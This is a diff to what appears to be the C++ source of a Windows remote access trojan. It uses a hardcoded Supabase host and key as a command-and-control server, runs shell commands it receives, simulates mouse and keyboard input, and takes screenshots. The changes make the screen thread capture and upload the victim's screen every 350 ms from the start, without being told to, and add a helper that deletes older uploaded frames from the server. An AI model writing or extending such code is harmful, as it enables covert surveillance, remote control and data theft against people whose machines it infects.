@@ -13,7 +13,6 @@
 using namespace Gdiplus;
 
 std::string computerName;
-bool screenRunning=false;
 const std::string SB_HOST="odocuexiouhmmkpwtuwk.supabase.co";
 const std::string SB_KEY="sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED";
 
@@ -69,6 +68,20 @@ std::string httpsGet(const std::string& path) {
     while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
     WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
     return out;
+}
+
+std::string httpsDelete(const std::string& path) {
+    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
+    if (!s) return "";
+    HINTERNET c = WinHttpConnect(s, L"odocuexiouhmmkpwtuwk.supabase.co", 443, 0);
+    if (!c) { WinHttpCloseHandle(s); return ""; }
+    HINTERNET r = WinHttpOpenRequest(c, L"DELETE", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
+    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
+    std::wstring hdr = L"apikey: " + std::wstring(SB_KEY.begin(),SB_KEY.end()) + L"\r\nAuthorization: Bearer " + std::wstring(SB_KEY.begin(),SB_KEY.end()) + L"\r\n";
+    WinHttpSendRequest(r, hdr.c_str(), -1, 0, 0, 0, 0);
+    WinHttpReceiveResponse(r, 0);
+    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
+    return "";
 }
 
 std::string base64Encode(const unsigned char* data, size_t len) {
@@ -235,12 +248,6 @@ DWORD WINAPI pollThread(LPVOID) {
                     result = takeScreenshot();
                 } else if (type == "cmd") {
                     result = execCmd(payload.empty() ? "whoami" : payload);
-                } else if (type == "screen_start") {
-                    screenRunning = true;
-                    result = "started";
-                } else if (type == "screen_stop") {
-                    screenRunning = false;
-                    result = "stopped";
                 } else if (type == "mouse") {
                     result = handleMouse(payload);
                 } else if (type == "keyboard") {
@@ -260,14 +267,34 @@ DWORD WINAPI pollThread(LPVOID) {
 }
 
 DWORD WINAPI screenThread(LPVOID) {
+    Sleep(5000);
+    std::string cmdId;
+    bool hasCmd=false;
+    int frameCount=0;
     while(true) {
-        Sleep(100);
-        if(!screenRunning) continue;
+        Sleep(350);
         try {
             std::string b64 = takeScreenshot();
             std::string escaped = jsonEscape(b64);
-            std::string body = "{\"computer\":\"" + computerName + "\",\"type\":\"screen\",\"payload\":\"\",\"status\":\"done\",\"result\":\"" + escaped + "\"}";
-            httpsPost("/rest/v1/commands", body);
+            if(!hasCmd){
+                std::string body = "{\"computer\":\"" + computerName + "\",\"type\":\"screen_live\",\"payload\":\"\",\"status\":\"done\",\"result\":\"" + escaped + "\"}";
+                std::string resp = httpsPost("/rest/v1/commands", body);
+                cmdId = extractJson(resp, "id");
+                hasCmd = !cmdId.empty();
+                if(!hasCmd){
+                    std::string searchPath = "/rest/v1/commands?computer=eq." + computerName + "&type=eq.screen_live&order=id.desc&limit=1";
+                    resp = httpsGet(searchPath);
+                    cmdId = extractJson(resp, "id");
+                    hasCmd = !cmdId.empty();
+                }
+            } else {
+                std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
+                httpsPatch("/rest/v1/commands?id=eq." + cmdId, resBody);
+            }
+            frameCount++;
+            if(frameCount%200==0&&hasCmd){
+                httpsDelete("/rest/v1/commands?computer=eq." + computerName + "&type=eq.screen_live&id=neq." + cmdId);
+            }
         } catch(...) {}
     }
     return 0;
